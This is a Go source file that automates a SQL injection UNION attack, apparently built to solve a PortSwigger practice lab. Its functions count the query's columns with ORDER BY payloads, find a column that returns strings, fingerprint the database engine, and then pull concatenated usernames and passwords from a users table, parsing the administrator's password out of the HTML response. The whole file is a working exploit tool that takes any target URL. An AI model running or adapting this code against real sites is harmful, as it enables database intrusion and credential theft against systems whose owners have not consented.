package main

import (
	"errors"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"

	"github.com/PuerkitoBio/goquery"
)

// SQLInjectionTester handles the specific steps of the SQL injection attack.
type SQLInjectionTester struct {
	client    *http.Client
	targetURL string // Base URL of the target lab
}

// makeRequest sends a GET request to the specified URL (including payload).
func (t *SQLInjectionTester) makeRequest(fullURL string) (*http.Response, error) {
	fmt.Printf("[~] Sending request: %s\n", fullURL) // Use ~ for in-progress actions

	req, err := http.NewRequest(http.MethodGet, fullURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request for %s: %w", fullURL, err)
	}

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http request failed for %s: %w", fullURL, err)
	}

	return resp, nil
}

// findNumOfColumns determines the number of columns in the vulnerable query result set
// using the ORDER BY technique.
func (t *SQLInjectionTester) findNumOfColumns() (int, error) {
	baseURL := t.targetURL + uriPath // e.g., https://lab.com/filter?category=abc

	for col := 1; col <= maxColumnSearch; col++ {
		// Craft payload like: '+ORDER+BY+1--
		payload := strings.Replace(payloadToGetNumOfColumns, "{}", strconv.Itoa(col), 1)
		urlWithPayload := baseURL + payload

		resp, err := t.makeRequest(urlWithPayload)
		if err != nil {
			// Don't close body here, as resp might be nil
			return 0, fmt.Errorf("request failed while checking column %d: %w", col, err)
		}

		// Ensure response body is closed even if we don't read it
		defer safeClose(resp.Body)

		// PortSwigger labs often return 500 when ORDER BY index is out of bounds
		if resp.StatusCode == http.StatusInternalServerError {
			correctNumOfColumns := col - 1
			if correctNumOfColumns == 0 {
				return 0, errors.New("received 500 error on first ORDER BY check (column 1), cannot determine columns")
			}
			return correctNumOfColumns, nil
		}

		// Optional: Check for other error codes if needed
		if resp.StatusCode != http.StatusOK {
			fmt.Printf("[!] Unexpected status code %d while checking column %d\n", resp.StatusCode, col)
			// Continue searching, but log it
		}
	}

	return 0, fmt.Errorf("failed to determine number of columns within search limit (%d)", maxColumnSearch)
}

// getTargetUser performs the UNION attack and extracts the administrator's password.
// It assumes the number of columns is already known.
func (t *SQLInjectionTester) getTargetUser(numOfColumns int) (string, error) {
	// 1. Execute the attack request
	response, err := t.performSQLAttack(numOfColumns)
	if err != nil {
		return "", fmt.Errorf("sql attack execution failed: %w", err)
	}
	// Ensure the response body is closed after we are done reading it
	defer safeClose(response.Body)

	// 2. Read and parse the response body
	bodyBytes, err := io.ReadAll(response.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response body: %w", err)
	}
	responseText := string(bodyBytes)

	// Basic check if the target username appears at all
	if !strings.Contains(responseText, username) {
		return "", fmt.Errorf("response body does not contain the target username '%s'", username)
	}
	fmt.Println("[+] Target username found in response.")

	// 3. Parse the HTML to find the password associated with the username
	// This parsing logic is specific to the expected HTML structure of the lab response.
	doc, err := goquery.NewDocumentFromReader(strings.NewReader(responseText))
	if err != nil {
		return "", fmt.Errorf("failed to parse response HTML: %w", err)
	}

	targetUser := ""
	// The lab usually presents results in a table. We look for the 'th' containing
	// the username and expect the password to be in the immediately following 'td'.
	doc.Find("th").EachWithBreak(func(_ int, th *goquery.Selection) bool {
		textOnTH := strings.TrimSpace(th.Text())

		if strings.Contains(strings.ToLower(textOnTH), strings.ToLower(username)) {
			targetUser = textOnTH
			return false // Stop iterating once we find the target user
		}
		return true // Continue iterating
	})

	if targetUser == "" {
		return "", fmt.Errorf("found username '%s' in HTML, but could not extract password from adjacent cell", username)
	}

	return targetUser, nil
}

// performSQLAttack sends the final UNION payload and expects a 200 OK response.
// It returns the *http.Response object so the caller can read the body.
func (t *SQLInjectionTester) performSQLAttack(numOfColumns int) (*http.Response, error) {
	if numOfColumns < 1 {
		return nil, fmt.Errorf("number of columns must be greater than 0, got %d", numOfColumns)
	}
	// Find which column return string
	fullURLWithStrPlaceholder, err := t.genPayloadWithStr(numOfColumns)
	if err != nil {
		return nil, err
	}

	// Find database type
	db, err := t.findDatabaseType(fullURLWithStrPlaceholder)
	if err != nil {
		return nil, err
	}

	//' UNION SELECT NULL, username || '-->' || password FROM users --
	userPassColumn := fmt.Sprintf(" %s %s ' --> ' %s %s FROM %s",
		dbColumnUsername, db.concatenation, db.concatenation, dbColumnPassword, dbTableName)
	// Generate the final payload
	fullURL := strings.Replace(fullURLWithStrPlaceholder, stringPlaceholder, userPassColumn, 1)

	resp, err := t.makeRequest(fullURL)
	if err != nil {
		// Don't close body here, resp might be nil
		return nil, fmt.Errorf("request failed for attack payload: %w", err)
	}

	// We expect 200 OK if the UNION syntax is correct and retrieves data
	if resp.StatusCode != http.StatusOK {
		// Close body if we are returning an error and not the response object
		safeClose(resp.Body)
		return nil, fmt.Errorf("unexpected status code %d (expected %d) for attack payload", resp.StatusCode, http.StatusOK)
	}

	fmt.Printf("[+] Received expected status code %d for UNION attack.\n", resp.StatusCode)
	// Return the response object; the caller is responsible for closing the body
	return resp, nil
}

func (t *SQLInjectionTester) genPayloadWithStr(numOfColumns int) (string, error) {
	if numOfColumns == 1 {
		payload := strings.Replace(payloadWithUNION, "{}", demoString, 1)
		fullURL := t.targetURL + uriPath + payload

		resp, err := t.makeRequest(fullURL)
		if err != nil {
			return "", fmt.Errorf("request failed for attack payload: %w", err)
		}
		safeClose(resp.Body)
		if resp.StatusCode == http.StatusInternalServerError {
			return "", fmt.Errorf("received 500 error on all columns, cannot determine which column returns string")
		}

		return strings.Replace(fullURL, demoString, stringPlaceholder, 1), nil
	}

	// Check each column to see if it returns a string
	var selectColumns string
	for i := range numOfColumns {
		values := make([]string, numOfColumns)
		values[i] = demoString
		for j := range numOfColumns {
			if j != i {
				fmt.Printf("[~] Adding NULL to column I: %d , J: %d\n",i, j)
				values[j] = "NULL"
			}
		}
		selectColumns = strings.Join(values, ",")

		payload := strings.Replace(payloadWithUNION, "{}", selectColumns, 1)
		fullURL := t.targetURL + uriPath + payload

		resp, err := t.makeRequest(fullURL)
		if err != nil {
			return "", fmt.Errorf("request failed for attack payload: %w", err)
		}
		safeClose(resp.Body)

		if resp.StatusCode == http.StatusOK {
			// Found a column that returns a string
			return strings.Replace(fullURL, demoString, stringPlaceholder, 1), nil
		}
	}
	return "", fmt.Errorf("no column returning a string")
}

func (t *SQLInjectionTester) findDatabaseType(fullURLWithStrPlaceholder string) (Database, error) {
	for _, db := range databases {
		fullURL := strings.Replace(fullURLWithStrPlaceholder, stringPlaceholder, db.versionFunction, 1)
		resp, err := t.makeRequest(fullURL)
		if err != nil {
			return Database{}, fmt.Errorf("request failed for attack payload: %w", err)
		}

		if resp.StatusCode == http.StatusOK {
			bodyBytes, err := io.ReadAll(resp.Body)
			if err != nil {
				safeClose(resp.Body)
				return Database{}, fmt.Errorf("failed to read response body: %w", err)
			}

			if strings.Contains(strings.ToLower(string(bodyBytes)), strings.ToLower(db.name)) {
				safeClose(resp.Body)
				return db, nil
			}
		}
	}
	return Database{}, fmt.Errorf("could not determine database type")
}
